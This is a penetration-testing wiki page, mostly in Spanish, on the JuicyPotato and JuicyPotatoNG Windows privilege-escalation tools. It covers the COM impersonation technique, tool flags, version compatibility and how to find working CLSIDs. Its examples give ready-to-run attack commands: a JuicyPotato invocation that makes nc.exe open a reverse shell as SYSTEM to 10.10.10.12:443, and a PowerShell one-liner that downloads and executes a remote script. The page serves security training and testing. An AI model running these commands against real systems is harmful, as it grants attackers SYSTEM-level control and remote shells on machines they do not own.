# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato es legacy. Generalmente funciona en versiones de Windows hasta Windows 10 1803 / Windows Server 2016. Los cambios que Microsoft introdujo a partir de Windows 10 1809 / Server 2019 rompieron la técnica original. Para esas versiones y posteriores, considera alternativas modernas como PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato y otras. Consulta la página más abajo para opciones y uso actualizados.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusando de los privilegios dorados) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Una versión azucarada de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un poco de jugo, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Notas rápidas de compatibilidad

- Funciona de forma fiable hasta Windows 10 1803 y Windows Server 2016 cuando el contexto actual tiene SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege.
- Interrumpido por el endurecimiento de Microsoft en Windows 10 1809 / Windows Server 2019 y posteriores. Prefiere las alternativas enlazadas arriba para esas builds.

### Resumen <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

Decidimos weaponize [RottenPotatoNG]: **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

Descubrimos que, además de `BITS`, hay varios COM servers que podemos abusar. Solo necesitan:

1. ser instanciables por el usuario actual, normalmente un “service user” que tiene privilegios de impersonation
2. implementar la interfaz `IMarshal`
3. ejecutarse como un usuario elevado (SYSTEM, Administrator, …)

Después de algunas pruebas obtuvimos y probamos una lista extensa de [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) en varias versiones de Windows.

### Detalles jugosos <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato te permite:

- **CLSID objetivo** _elige cualquier CLSID que desees._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _puedes encontrar la lista organizada por OS._
- **Puerto de escucha COM** _define el puerto de escucha COM que prefieras (en lugar del marshalled hardcoded 6666)_
- **Dirección IP de escucha COM** _vincula el servidor a cualquier IP_
- **Modo de creación de procesos** _dependiendo de los privilegios del usuario suplantado puedes elegir entre:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Proceso a lanzar** _lanza un ejecutable o script si la explotación tiene éxito_
- **Argumentos del proceso** _personaliza los argumentos del proceso lanzado_
- **Dirección del servidor RPC** _para un enfoque sigiloso puedes autenticarte en un servidor RPC externo_
- **Puerto del servidor RPC** _útil si quieres autenticarte en un servidor externo y el firewall está bloqueando el puerto `135`…_
- **Modo TEST** _principalmente para pruebas, i.e. testing CLSIDs. Crea el DCOM e imprime el usuario del token. See_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Uso <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Reflexiones finales <a href="#final-thoughts" id="final-thoughts"></a>

[**De juicy-potato README**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Si el usuario tiene privilegios `SeImpersonate` o `SeAssignPrimaryToken`, entonces eres **SYSTEM**.

Es casi imposible prevenir el abuso de todos estos COM Servers. Podrías pensar en modificar los permisos de estos objetos mediante `DCOMCNFG`, pero buena suerte, esto va a ser un desafío.

La solución real es proteger cuentas sensibles y aplicaciones que se ejecutan bajo las cuentas `* SERVICE`. Detener `DCOM` sin duda inhibiría este exploit, pero podría tener un impacto serio en el sistema operativo subyacente.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG reintroduce una escalada de privilegios local al estilo JuicyPotato en Windows modernos combinando:
- DCOM OXID resolution to a local RPC server on a chosen port, avoiding the old hardcoded 127.0.0.1:6666 listener.
- Un hook SSPI para capturar e impersonar la autenticación entrante de SYSTEM sin requerir RpcImpersonateClient, lo que también permite CreateProcessAsUser cuando solo está presente SeAssignPrimaryTokenPrivilege.
- Trucos para satisfacer las restricciones de activación de DCOM (por ejemplo, el former INTERACTIVE-group requirement when targeting PrintNotify / ActiveX Installer Service classes).

Notas importantes (comportamiento en evolución a través de las versiones):
- septiembre de 2022: la técnica inicial funcionó en sistemas Windows 10/11 y Server soportados usando el “INTERACTIVE trick”.
- actualización de enero de 2023 por los autores: Microsoft más tarde bloqueó el truco INTERACTIVE. Un CLSID diferente ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restaura la explotación pero solo en Windows 11 / Server 2022 según su publicación.

Uso básico (más flags en la ayuda):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Si apuntas a Windows 10 1809 / Server 2019 donde el JuicyPotato clásico está parcheado, prefiere las alternativas enlazadas arriba (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG puede ser situacional dependiendo del build y del estado del servicio.

## Ejemplos

Nota: Visita [esta página](https://ohpe.it/juicy-potato/CLSID/) para una lista de CLSIDs para probar.

### Obtener una reverse shell con nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Launch a new CMD (if you have RDP access)

![](<../../images/image (300).png>)

## CLSID Problems

Con frecuencia, el CLSID predeterminado que JuicyPotato usa **no funciona** y el exploit falla. Por lo general, se necesitan múltiples intentos para encontrar un **CLSID que funcione**. Para obtener una lista de CLSIDs para probar en un sistema operativo específico, debes visitar esta página:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Comprobación de CLSIDs**

Primero, necesitarás algunos ejecutables además de juicypotato.exe.

Descarga [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) y cárgalo en tu PS session, y descarga y ejecuta [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ese script creará una lista de posibles CLSIDs para probar.

Luego descarga [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (cambia la ruta a la lista de CLSID y al ejecutable juicypotato) y ejecútalo. Empezará a probar cada CLSID, y **cuando cambie el número de puerto, significará que el CLSID funcionó**.

**Comprueba** los CLSIDs que funcionan **usando el parámetro -c**

## References

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
